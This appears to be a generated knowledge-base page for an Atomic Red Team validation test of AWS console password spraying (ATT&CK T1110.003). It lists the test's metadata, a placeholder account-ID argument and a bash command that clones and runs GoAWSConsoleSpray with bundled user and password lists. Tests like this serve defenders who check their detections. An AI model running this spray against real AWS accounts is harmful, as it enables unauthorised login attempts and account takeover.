---
atomic_guid: "9c10d16b-20b1-403a-8e67-50ef7117ed4e"
title: "AWS - Password Spray an AWS using GoAWSConsoleSpray"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "9c10d16b-20b1-403a-8e67-50ef7117ed4e"
  - "AWS - Password Spray an AWS using GoAWSConsoleSpray"
platforms:
  - "iaas:aws"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# AWS - Password Spray an AWS using GoAWSConsoleSpray

GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/

## Metadata

- Atomic GUID: 9c10d16b-20b1-403a-8e67-50ef7117ed4e
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: iaas:aws
- Executor: sh
- Elevation Required: False
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### aws_account_id

- description: ID of the AWS account
- type: string
- default: XXXXXXXX

## Dependencies

Check if go is installed

### Prerequisite Check

```untitled
go version
```

### Get Prerequisite

```untitled
echo Install GO
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
cd /tmp
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
cd /tmp/GoAWSConsoleSpray
go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
```

### Cleanup

```bash
rm -rf /tmp/GoAWSConsoleSpray
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
